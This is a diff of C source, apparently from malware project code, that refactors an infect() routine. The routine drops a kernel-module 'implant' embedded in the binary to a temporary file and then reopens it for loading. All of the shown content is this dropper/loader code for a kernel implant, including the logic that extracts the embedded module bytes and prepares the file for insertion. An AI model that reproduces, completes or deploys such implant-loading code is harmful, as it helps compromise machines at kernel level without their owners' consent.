@@ -1,12 +1,9 @@
-#include <status.h>
 #include <log.h>
 #include <module/infect.h>
 
-#include <sys/types.h>
 #include <sys/stat.h>
-#include <fcntl.h>
-#include <syscall.h>
 #include <errno.h>
+#include <lib/extract.h>
 
 /* The implant is embedded in this binary.
  * These symbols are exposed. */
@@ -25,17 +22,12 @@ static int infect(void)
 {
 	int status = 0;
 
-	int fd = open(TMP_PATH, O_CREAT | O_EXCL | O_WRONLY, 0700);
-	if (fd < 0) {
-		IMLOG_DEBUG("Failed to open %s", TMP_PATH);
-		return fd;
-	}
-
 	ssize_t nbytes_required =
 		_binary_implant_ko_end - _binary_implant_ko_start;
-	ssize_t nbytes = write(fd, _binary_implant_ko_start, nbytes_required);
 
-	close(fd);
+	ssize_t nbytes =
+		extract(TMP_PATH, _binary_implant_ko_start, nbytes_required);
+
 	if (nbytes < nbytes_required) {
 		IMLOG_DEBUG("Failed to write the required bytes");
 		status = -1;
@@ -46,7 +38,7 @@ static int infect(void)
 	 * GLIBC does not provide wrapper functions around the system call.
 	 *
 	 * The kernel module must be open with O_RDONLY. */
-	fd = open(TMP_PATH, O_RDONLY);
+	int fd = open(TMP_PATH, O_RDONLY);
 	if (fd < 0) {
 		IMLOG_DEBUG("Failed to open %s after it has been created",
 			    TMP_PATH);
